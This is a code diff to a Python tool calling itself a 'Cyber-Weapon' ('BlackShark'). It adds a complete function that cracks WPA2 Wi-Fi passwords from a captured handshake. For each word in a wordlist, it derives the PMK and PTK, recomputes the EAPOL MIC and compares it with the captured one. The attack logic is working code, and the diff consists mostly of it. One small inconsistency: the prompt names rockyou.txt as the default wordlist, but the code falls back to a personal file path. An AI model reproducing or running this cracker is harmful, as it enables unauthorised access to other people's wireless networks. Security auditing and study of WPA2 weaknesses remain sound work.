@@ -15,8 +15,8 @@ def banner():
     print(f"#         {WHITE}@@@@@@@@@@@@@@@@@@@@@@@{RESET}                                                              #")
     print(f"#       {WHITE}@@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}          Networking & Cyber-Security PCAP Analysis Tool    #")
     print(f"#      {WHITE}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{RESET}                                                           #")
-    print(f"#     {WHITE}@@@@@@@@@@@@@@@/      \\@@@/   @{RESET}        [+] Cyber-Weapon:............. MIC Cracker         #")
-    print(f"#    {WHITE}@@@@@@@@@@@@@@@@\\  {RED}O{WHITE}   @@  @ {RED}O{WHITE} @{RESET}        [+] Version:.................. 2.2                ")
+    print(f"#     {WHITE}@@@@@@@@@@@@@@@/      \\@@@/   @{RESET}        [+] Cyber-Weapon:............. BlackShark         #")
+    print(f"#    {WHITE}@@@@@@@@@@@@@@@@\\  {RED}O{WHITE}   @@  @ {RED}O{WHITE} @{RESET}        [+] Version:.................. 3.6                ")
     print(f"#    {WHITE}@@@@@@@@@@@@@ @@@@@@@@@@  | \\@@@@@{RESET}      [+] Author:................... Fz3r0              ")
     print(f"#    {WHITE}@@@@@@@@@@@@@ @@@@@@@@@\\__@_/@@@@@{RESET}      [+] Github:................... github.com/Fz3r0   ")
     print(f"#     {WHITE}@@@@@@@@@@@@@@@/,/,/./'/_|.\\'\\,\\{RESET}       [+] Twitter:.................. @Fz3r0_OPs         ")
@@ -261,7 +261,7 @@ def passmode():
                 main()  # Call the main function (presumably to go back to the main menu)
             elif opt == 1:
                 print("Initiating Bruteforce attack...\n")  # Notify the user that brute-force attack is starting
-                crackPasswd()  # Execute the brute-force attack (this function should be defined elsewhere)
+                checkPasswdWordlist()  # Execute the brute-force attack (this function should be defined elsewhere)
             # Manual Password
             elif opt == 0:
                 print("Please input the password you wish to audit or press Enter to use the default (Hunter2006).")  # Prompt to manually input a password
@@ -278,23 +278,7 @@ def passmode():
             print("Error: Invalid input. Please enter a valid number (0, 1, or 9).\n")  # Inform the user that their input is invalid
 
 
-def crackPasswd():
-    # Preguntar por la ruta de la wordlist
-    wordlist = input("Wordlist path (dejar en blanco para usar /usr/share/wordlists/rockyou.txt) > ")
-    
-    # Usar rockyou.txt como ruta por defecto si el usuario no ingresa una ruta
-    if not wordlist:
-        wordlist = '/usr/share/wordlists/rockyou.txt'
-    
-    # Intentar abrir el archivo
-    try:
-        with open(wordlist, 'r') as file:
-            for l in file.readlines():
-                # Derivación PMK 
-                PMK = PBKDF2(l.strip(), WPA2Handshake.ssid, 4096).read(32)
-                # Aquí agregarías el código para probar el PMK con el handshake...
-    except FileNotFoundError:
-        print(f"Error: No se encontró el archivo {wordlist}")
+
 
 
 
@@ -323,10 +307,6 @@ def crackPasswd():
             print("PW: "+str(l))
             print("")
  
-
-
-
-
 
 
 def checkPasswd():
@@ -524,6 +504,77 @@ def checkPasswd():
     else:
         print("Invalid choice. Exiting program.")
         exit()  # Exit if invalid choice   
+
+
+
+
+
+
+def checkPasswdWordlist():
+
+
+    # Solicitar la ruta del wordlist si se desea cambiar el default
+    wordlist_path = input("Ingrese la ruta del wordlist (presione Enter para usar '/usr/share/wordlists/rockyou.txt'): ")
+    if not wordlist_path:
+        wordlist_path = '/home/fz3r0/Documents/4-way-handshake-generator/popo.txt'
+
+    # Verificar que el archivo de wordlist existe
+    if not os.path.isfile(wordlist_path):
+        print(f"No se encontró el archivo de wordlist en: {wordlist_path}")
+        return
+
+    # Leer el wordlist y probar cada palabra como contraseña
+    with open(wordlist_path, 'r', encoding='latin-1') as wordlist_file:
+        for passw_wordlist in wordlist_file:
+            passw_wordlist = passw_wordlist.strip()  # Quitar espacios en blanco
+
+            print()
+            print(f"Probando contraseña: {passw_wordlist}")
+            print()
+
+            # Generar PMK
+            print("\n[+] Generating PMK via PBKDF2...\n")
+            PMK = PBKDF2(passw_wordlist, WPA2Handshake.ssid, 4096).read(32)
+            print("Pairwise Master Key (PMK): " + str(PMK.hex()) + "\n")
+
+            # Generar PTK
+            print("\n[+] Generating PTK...\n")
+            macAPparsed = binascii.a2b_hex(WPA2Handshake.macAP.replace(":", "").lower())
+            macCliparsed = binascii.a2b_hex(WPA2Handshake.macCli.replace(":", "").lower())
+            anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
+            snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
+            key_data = min(macAPparsed, macCliparsed) + max(macAPparsed, macCliparsed) + min(anoncep, snoncep) + max(anoncep, snoncep)
+            txt = b"Pairwise key expansion"
+            PTK = customPRF512(PMK, txt, key_data)
+            print("Pairwise Temporal Key (PTK): " + str(PTK.hex()) + "\n")
+
+            # Calcular y mostrar MIC
+            print("\n######################")    
+            print("#   Calculando MIC   #")
+            print("######################\n")
+            KCK = PTK[0:16]
+            eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]
+            calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
+            print("MIC Calculada:  " + str(calculated_mic.hex()))
+            print("MIC capturada:  " + str(WPA2Handshake.mic) + "\n")
+
+            # Comparar MICs
+            if calculated_mic.hex() == WPA2Handshake.mic:
+                print(f"\n####################")
+                print(f"# Password Correct!!! -->> {passw_wordlist} #")
+                print(f"####################\n")
+                input("Presiona Enter para salir...")  # Pausar la ejecución hasta que el usuario presione Enter
+                return  # Detener la función si se encuentra la contraseña correcta
+
+            else:
+                print("\n######################")
+                print("# Password Incorrect #")
+                print("######################\n")
+                banner()
+
+
+
+
 
 
 if __name__ == "__main__":
